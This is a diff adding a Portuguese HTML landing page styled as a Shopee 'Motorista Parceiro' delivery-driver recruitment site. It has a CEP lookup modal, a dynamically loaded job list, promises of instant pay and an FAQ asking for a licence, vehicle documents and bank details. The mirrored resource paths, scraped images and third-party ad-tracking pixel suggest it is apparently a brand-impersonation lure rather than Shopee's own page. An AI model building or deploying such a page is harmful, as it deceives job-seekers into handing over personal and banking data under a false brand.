@@ -1,0 +1,579 @@
+﻿<!DOCTYPE html><html lang="pt-BR"><head>
+    <script src="../../scripts/utms/latest-6.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  window.pixelId = "6831e7bd3fe783e25540d199";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <title>Shopee Delivery Partners</title>
+
+    <script src="../../3.4-4.16"></script>
+    <link href="../../css2-4?family=Roboto:wght@400;500;700&family=Poppins:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/all.min.css">
+
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              shopee: "#EE4D2D",
+              "custom-orange": "#EE4D2D",
+            },
+          },
+        },
+      };
+    </script>
+
+    <style>
+      body {
+        font-family: "Poppins", sans-serif;
+      }
+
+      .bg-shopee {
+        background-color: #ee4d2d;
+      }
+
+      .text-shopee {
+        color: #ee4d2d;
+      }
+
+      .hamburger-line {
+        width: 24px;
+        height: 3px;
+        background-color: #ee4d2d;
+        margin: 4px 0;
+        transition: 0.4s;
+      }
+
+      .hamburger-line:nth-child(1) {
+        width: 16px;
+      }
+
+      .hamburger-line:nth-child(2) {
+        width: 20px;
+      }
+
+      .carousel {
+        overflow: hidden;
+        position: relative;
+        width: 100%;
+      }
+
+      .carousel-inner {
+        display: flex;
+        transition: transform 0.5s ease;
+      }
+
+      .carousel-item {
+        flex: 0 0 100%;
+      }
+
+      .carousel-control {
+        position: absolute;
+        top: 50%;
+        transform: translateY(-50%);
+        background: rgba(238, 77, 45, 0.2);
+        color: #ee4d2d;
+        padding: 10px;
+        text-decoration: none;
+        border-radius: 50%;
+        width: 40px;
+        height: 40px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .carousel-control-prev {
+        left: 10px;
+      }
+
+      .carousel-control-next {
+        right: 10px;
+      }
+
+      .custom-scrollbar::-webkit-scrollbar {
+        width: 8px;
+      }
+
+      .custom-scrollbar::-webkit-scrollbar-track {
+        background: transparent;
+      }
+
+      .custom-scrollbar::-webkit-scrollbar-thumb {
+        background-color: #e83d2280;
+        border-radius: 4px;
+      }
+
+      .custom-scrollbar::-webkit-scrollbar-thumb:hover {
+        background-color: #e83d22;
+      }
+
+      ol.list-decimal > li::marker {
+        font-weight: bold;
+        color: #e83d22;
+      }
+
+      .btn-primary {
+        background-color: #ee4d2d;
+        color: #fff;
+        font-weight: 500;
+        height: 50px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 3px;
+        transition: background-color 0.3s;
+      }
+
+      .btn-primary:hover {
+        background-color: rgb(148, 48, 28);
+      }
+
+      .btn-primary:disabled {
+        background-color: rgb(255, 149, 128);
+        cursor: not-allowed;
+      }
+
+      .status-item {
+        transition: all 0.3s ease;
+      }
+
+      .status-item.active .status-icon {
+        background-color: #e83d22;
+        color: white;
+      }
+
+      .status-item.active .status-text {
+        color: #111827;
+        font-weight: 500;
+      }
+
+      @keyframes bounce {
+        0%,
+        80%,
+        100% {
+          transform: scale(0);
+        }
+        40% {
+          transform: scale(1);
+        }
+      }
+
+      .loading-dot {
+        animation: bounce 1.4s infinite ease-in-out both;
+      }
+
+      .loading-dot:nth-child(1) {
+        animation-delay: -0.32s;
+      }
+
+      .loading-dot:nth-child(2) {
+        animation-delay: -0.16s;
+      }
+    </style>
+  </head>
+
+  <body class="bg-white">
+    <div id="cepModal" class="fixed inset-0 z-50 overflow-y-auto bg-black bg-opacity-60 hidden">
+      <div class="flex min-h-screen items-center justify-center p-4">
+        <div class="relative mx-auto max-w-md w-full bg-white rounded-lg p-8 shadow-2xl animate-fade-in duration-300">
+          <div class="flex flex-col space-y-5">
+            <div class="flex justify-between items-center mb-2">
+              <h2 class="text-2xl font-bold text-gray-900">
+                Bem-vindo a Shopee
+              </h2>
+
+              <img src="images/shopee-logo-png_seeklogo-378738.png" alt="Shopee Logo" class="h-20 w-20">
+            </div>
+
+            <div class="h-px w-full bg-gray-100"></div>
+
+            <p class="text-gray-600">
+              Para continuar, informe seu CEP para verificarmos a
+              disponibilidade na sua localidade.
+            </p>
+
+            <div class="space-y-2">
+              <label for="cep" class="font-medium text-gray-700">CEP</label>
+              <div class="flex justify-center">
+                <input id="cep" type="text" inputmode="numeric" pattern="[0-9]*" placeholder="00000-000" class="cep-input border-[rgba(0,0,0,0.15)] rounded-lg px-4 py-3.5 text-base font-medium h-14 max-w-[200px] focus:outline-none focus:border-[#ee4d2d] focus:ring-1 focus:ring-[#E83D22]" style="border-width: 1px" maxlength="9" autocomplete="postal-code">
+              </div>
+            </div>
+
+            <div id="cepLoading" class="flex justify-center py-2 hidden">
+              <div class="h-6 w-6 rounded-full border-3 border-t-transparent border-[#E83D22] animate-spin"></div>
+            </div>
+
+            <div id="cepError" class="text-red-500 text-sm font-medium py-1 bg-red-50 p-3 rounded-md border border-red-100 hidden"></div>
+
+            <div id="cepSuccess" class="bg-[#fffff6] p-4 rounded-md border border-[#E83D22] hidden">
+              <div class="flex items-center">
+                <div class="mr-3 text-[#E83D22]">
+                  <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
+                    <circle cx="12" cy="10" r="3"></circle>
+                  </svg>
+                </div>
+                <div>
+                  <p class="text-gray-700">
+                    <span class="font-medium">Localização:</span>
+                    <span id="cepCity" class="ml-1 font-semibold"></span>
+                  </p>
+                  <p class="text-xs text-gray-500 mt-1">
+                    Entregas disponíveis para sua região
+                  </p>
+                </div>
+              </div>
+            </div>
+
+            <div class="flex flex-col space-y-3 pt-2">
+              <button id="btnResetCep" class="w-full bg-white border border-gray-200 hover:bg-gray-50 text-gray-700 py-4 rounded hidden">
+                Buscar novo CEP
+              </button>
+
+              <button id="btnConfirmCep" class="btn-primary w-full" disabled="">
+                Verificar CEP
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <header class="bg-white shadow-md">
+      <div class="container mx-auto px-4 py-4 flex items-center justify-between">
+        <a href="index.html">
+          <img src="images/057b274c134bcf92ac151758478949b3.jpg" alt="Shopee Logo" class="h-8 cursor-pointer">
+        </a>
+        <div class="hamburger-menu cursor-pointer">
+          <div class="hamburger-line w-[16px] h-[3px] bg-[#2d3562] my-1 transition-all duration-400"></div>
+          <div class="hamburger-line w-[20px] h-[3px] bg-[#2d3562] my-1 transition-all duration-400"></div>
+          <div class="hamburger-line w-[24px] h-[3px] bg-[#2d3562] my-1 transition-all duration-400"></div>
+        </div>
+      </div>
+    </header>
+
+    <div class="w-full bg-[#f3f4f6] py-1 px-6 flex items-center">
+      <div class="flex items-center">
+        <div class="mr-3">
+          <span style="
+              color: #ee4d2d;
+              font-size: 28px;
+              font-weight: 900;
+              display: inline-block;
+              -webkit-text-stroke: 2px #ee4d2d;
+            ">
+            >
+          </span>
+        </div>
+        <div class="leading-none">
+          <h1 class="text-base font-bold" style="color: #ee4d2d">
+            Motorista Parceiro
+          </h1>
+          <p class="text-sm mt-0" style="transform: translateY(-2px); color: #ee4d2d">
+            Shopee
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <section class="bg-shopee relative overflow-hidden">
+      <img src="images/Sem-nome-Story-1.webp" alt="Shopee Delivery Partners" class="w-full">
+    </section>
+
+    <section class="carousel">
+      <div class="carousel-inner" id="carouselInner">
+        <div class="carousel-item">
+          <img src="images/br-11134258-7r98o-m21cpuqxu6ana5.webp" alt="Shopee Delivery Image 1" class="w-full">
+        </div>
+        <div class="carousel-item">
+          <img src="images/br-11134258-7r98o-m21cqh315henad.webp" alt="Shopee Delivery Image 2" class="w-full">
+        </div>
+        <div class="carousel-item">
+          <img src="images/br-11134258-7r98o-m21cqu20650kad.webp" alt="Shopee Delivery Image 3" class="w-full">
+        </div>
+      </div>
+      <a class="carousel-control carousel-control-prev" href="#" role="button" id="prevButton">
+        <i class="fas fa-chevron-left"></i>
+      </a>
+      <a class="carousel-control carousel-control-next" href="#" role="button" id="nextButton">
+        <i class="fas fa-chevron-right"></i>
+      </a>
+    </section>
+
+    <section class="container mx-auto px-4 py-8 text-[#555]">
+      <h2 class="text-xl font-semibold mb-4 border-b-2 border-gray-200 pb-2">
+        Como funciona o Programa Motoristas Parceiros do Shopee?
+      </h2>
+      <p class="mb-6 leading-relaxed">
+        O Programa de Motoristas Parceiros do Shopee é uma oportunidade para
+        quem deseja ganhar uma renda extra realizando coletas, transferências ou
+        entregas de pacotes. Com horários flexíveis e autonomia para organizar
+        sua agenda, você escolhe quando e onde quer trabalhar.
+      </p>
+      <p class="mb-6 leading-relaxed">
+        O Shopee aceita diferentes tipos de veículos, como
+        <span class="font-bold text-custom-orange">motos, carros de passeio (2 ou 4 portas), Fiorino, Kombi e vans</span>. Isso permite que mais pessoas possam participar e transformar seu
+        veículo em uma fonte de renda.
+      </p>
+
+      <h3 class="text-lg font-semibold mt-8 mb-4 border-b-2 border-gray-200 pb-2">
+        Ganhos como Motorista Parceiro Shopee
+      </h3>
+      <p class="mb-6 leading-relaxed">
+        Na Shopee, os pagamentos são realizados de forma instantânea. Assim que
+        o motorista finaliza a rota, o valor correspondente é imediatamente
+        transferido para sua conta. Isso garante maior segurança e agilidade
+        para nossos parceiros, permitindo que eles tenham acesso rápido aos seus
+        ganhos e possam planejar melhor suas finanças.
+      </p>
+
+      <h3 class="text-lg font-semibold mt-8 mb-4 border-b-2 border-gray-200 pb-2">
+        Como se cadastrar
+      </h3>
+      <p class="mb-6 leading-relaxed">
+        O cadastro é totalmente online. Para participar, basta:
+      </p>
+      <ol class="list-decimal list-inside mb-6 pl-4">
+        <li>Verificar a disponibilidade de vagas na sua região;</li>
+        <li>Informar o modelo do seu veículo e seus dados pessoais;</li>
+        <li>
+          Se houver vagas disponíveis, clique no botão para iniciar o cadastro;
+        </li>
+        <li>Finalize o processo e aguarde a aprovação.</li>
+      </ol>
+      <p class="mb-6 leading-relaxed">
+        Após o cadastro, você poderá acessar as rotas disponíveis, gerenciar sua
+        agenda e acompanhar seus ganhos em tempo real diretamente pelo
+        aplicativo.
+      </p>
+    </section>
+
+    <div class="p-4 sm:p-6 lg:p-8">
+      <div class="max-w-6xl mx-auto">
+        <h1 class="text-xl sm:text-2xl font-bold text-center mb-8 sm:mb-12 text-gray-800">
+          Vagas para Motorista Parceiro
+        </h1>
+
+        <div id="loadingJobs" class="text-center py-10">
+          <div class="inline-block h-8 w-8 animate-spin rounded-full border-4 border-solid border-[#EE4E2E] border-r-transparent"></div>
+          <p class="mt-4 text-gray-600">Carregando vagas disponíveis...</p>
+        </div>
+
+        <div id="jobError" class="text-center py-10 hidden">
+          <p class="text-red-500">
+            Erro ao carregar as vagas. Por favor, tente novamente mais tarde.
+          </p>
+        </div>
+
+        <div id="jobsList" class="bg-white border border-gray-200 rounded-lg overflow-hidden shadow-lg hidden">
+          <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 divide-y-[5px] sm:divide-y-0 sm:divide-x-[5px] divide-gray-200" id="jobsGrid"></div>
+        </div>
+      </div>
+    </div>
+
+    <section class="bg-gradient-to-b from-white to-orange-50 py-16 px-4">
+      <div class="container mx-auto">
+        <div class="text-center mb-10">
+          <h2 class="text-2xl md:text-3xl font-bold text-gray-800 mb-3">
+            Vantagens de ser um Motorista Parceiro Shopee
+          </h2>
+          <div class="w-20 h-1 bg-custom-orange mx-auto rounded-full"></div>
+          <p class="mt-4 text-gray-600 max-w-3xl mx-auto">
+            Junte-se a milhares de motoristas que já estão transformando seu
+            tempo em oportunidades lucrativas
+          </p>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-5 gap-6">
+          <div class="bg-white p-6 rounded-lg shadow-lg transition-transform duration-300 hover:transform hover:-translate-y-2 border-t-4 border-custom-orange">
+            <div class="text-custom-orange text-4xl mb-4 flex justify-center">
+              <i class="fas fa-money-bill-wave"></i>
+            </div>
+            <h3 class="text-lg font-semibold mb-3 text-center">
+              Pagamento Instantâneo
+            </h3>
+            <p class="text-gray-600 text-center text-sm">
+              Receba seu pagamento assim que finalizar a rota, sem precisar
+              esperar.
+            </p>
+          </div>
+
+          <div class="bg-white p-6 rounded-lg shadow-lg transition-transform duration-300 hover:transform hover:-translate-y-2 border-t-4 border-custom-orange">
+            <div class="text-custom-orange text-4xl mb-4 flex justify-center">
+              <i class="fas fa-clock"></i>
+            </div>
+            <h3 class="text-lg font-semibold mb-3 text-center">
+              Horários Flexíveis
+            </h3>
+            <p class="text-gray-600 text-center text-sm">
+              Escolha quando e onde quer trabalhar, com total autonomia para
+              organizar sua agenda.
+            </p>
+          </div>
+
+          <div class="bg-white p-6 rounded-lg shadow-lg transition-transform duration-300 hover:transform hover:-translate-y-2 border-t-4 border-custom-orange">
+            <div class="text-custom-orange text-4xl mb-4 flex justify-center">
+              <i class="fas fa-car"></i>
+            </div>
+            <h3 class="text-lg font-semibold mb-3 text-center">
+              Diversos Veículos
+            </h3>
+            <p class="text-gray-600 text-center text-sm">
+              Use seu veículo como fonte de renda: motos, carros, vans e mais.
+            </p>
+          </div>
+
+          <div class="bg-white p-6 rounded-lg shadow-lg transition-transform duration-300 hover:transform hover:-translate-y-2 border-t-4 border-custom-orange">
+            <div class="text-custom-orange text-4xl mb-4 flex justify-center">
+              <i class="fas fa-route"></i>
+            </div>
+            <h3 class="text-lg font-semibold mb-3 text-center">
+              Rotas Otimizadas
+            </h3>
+            <p class="text-gray-600 text-center text-sm">
+              Sistema inteligente que agrupa entregas próximas, maximizando sua
+              produtividade.
+            </p>
+          </div>
+
+          <div class="bg-white p-6 rounded-lg shadow-lg transition-transform duration-300 hover:transform hover:-translate-y-2 border-t-4 border-custom-orange">
+            <div class="text-custom-orange text-4xl mb-4 flex justify-center">
+              <i class="fas fa-shield-alt"></i>
+            </div>
+            <h3 class="text-lg font-semibold mb-3 text-center">
+              Suporte Dedicado
+            </h3>
+            <p class="text-gray-600 text-center text-sm">
+              Equipe especializada disponível para ajudar em qualquer situação
+              durante seu trabalho.
+            </p>
+          </div>
+        </div>
+
+        <div class="text-center mt-12 rounded-lg p-8 text-white shadow-lg" style="background-color: #ee4d2d">
+          <h3 class="text-xl font-bold mb-4">
+            Você está no controle. Você define seus ganhos.
+          </h3>
+          <p class="max-w-3xl mx-auto">
+            No Shopee, acreditamos que você merece flexibilidade e recompensas
+            justas pelo seu trabalho. Nossa plataforma foi projetada para
+            valorizar cada entrega que você faz, garantindo os melhores ganhos
+            do mercado.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <section class="py-12 px-4">
+      <div class="container mx-auto max-w-3xl">
+        <h2 class="text-xl font-semibold mb-8 text-center">
+          Perguntas Frequentes
+        </h2>
+
+        <div class="space-y-4">
+          <div class="border border-gray-200 rounded-lg overflow-hidden">
+            <div class="bg-gray-50 px-4 py-3 cursor-pointer flex justify-between items-center faq-question">
+              <h3 class="font-medium">
+                Quais documentos são necessários para o cadastro?
+              </h3>
+              <i class="fas fa-chevron-down text-custom-orange"></i>
+            </div>
+            <div class="px-4 py-3 faq-answer hidden">
+              <p class="text-gray-600">
+                Para se cadastrar como Motorista Parceiro, você precisará de CNH
+                válida, documento do veículo, comprovante de residência e dados
+                bancários para recebimento.
+              </p>
+            </div>
+          </div>
+
+          <div class="border border-gray-200 rounded-lg overflow-hidden">
+            <div class="bg-gray-50 px-4 py-3 cursor-pointer flex justify-between items-center faq-question">
+              <h3 class="font-medium">Como funciona o pagamento?</h3>
+              <i class="fas fa-chevron-down text-custom-orange"></i>
+            </div>
+            <div class="px-4 py-3 faq-answer hidden">
+              <p class="text-gray-600">
+                O pagamento é realizado de forma instantânea após a finalização
+                de cada rota. O valor é transferido diretamente para a conta
+                bancária cadastrada.
+              </p>
+            </div>
+          </div>
+
+          <div class="border border-gray-200 rounded-lg overflow-hidden">
+            <div class="bg-gray-50 px-4 py-3 cursor-pointer flex justify-between items-center faq-question">
+              <h3 class="font-medium">Posso escolher minha área de atuação?</h3>
+              <i class="fas fa-chevron-down text-custom-orange"></i>
+            </div>
+            <div class="px-4 py-3 faq-answer hidden">
+              <p class="text-gray-600">
+                Sim, você pode escolher as regiões onde deseja trabalhar, desde
+                que haja disponibilidade de rotas nessas áreas.
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="bg-shopee py-14 px-4">
+      <div class="container mx-auto text-center">
+        <h2 class="text-2xl md:text-3xl font-bold text-white mb-4">
+          Torne-se um Motorista Parceiro Shopee Hoje!
+        </h2>
+        <p class="text-white mb-6 max-w-2xl mx-auto text-lg">
+          Transforme seu veículo em uma fonte de renda extra com horários
+          flexíveis e pagamentos instantâneos.
+        </p>
+        <div class="flex flex-col md:flex-row justify-center md:space-x-8 space-y-4 md:space-y-0 mt-6">
+          <div class="bg-white bg-opacity-30 p-4 rounded-lg backdrop-blur-sm">
+            <span class="text-white font-bold text-3xl">27</span>
+            <p class="text-white text-sm mt-1">Estados Atendidos</p>
+          </div>
+          <div class="bg-white bg-opacity-30 p-4 rounded-lg backdrop-blur-sm">
+            <span class="text-white font-bold text-3xl">+5.000</span>
+            <p class="text-white text-sm mt-1">Parceiros Ativos</p>
+          </div>
+          <div class="bg-white bg-opacity-30 p-4 rounded-lg backdrop-blur-sm">
+            <span class="text-white font-bold text-3xl">24h</span>
+            <p class="text-white text-sm mt-1">Suporte Disponível</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer class="bg-[#EE4D2D] text-white py-10 mt-auto">
+      <div class="container mx-auto px-4">
+        <div class="flex flex-col md:flex-row justify-between items-center">
+          <div class="mb-6 md:mb-0">
+            <img src="images/057b274c134bcf92ac151758478949b3.jpg" alt="Shopee Logo" class="h-10 mb-2 mx-auto md:mx-0 bg-white p-1 rounded">
+            <p class="text-sm text-center md:text-left">
+              © 2024 Shopee. Todos os direitos reservados.
+            </p>
+          </div>
+
+          <div class="text-center md:text-right">
+            <p class="text-sm opacity-80 mb-2">
+              Programa de Parceiros Entregadores Shopee
+            </p>
+            <p class="text-xs opacity-70">
+              Trabalhe conosco e faça parte da nossa equipe de entregas
+            </p>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    <script src="js/index.js"></script>
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+  
+
+</body></html>
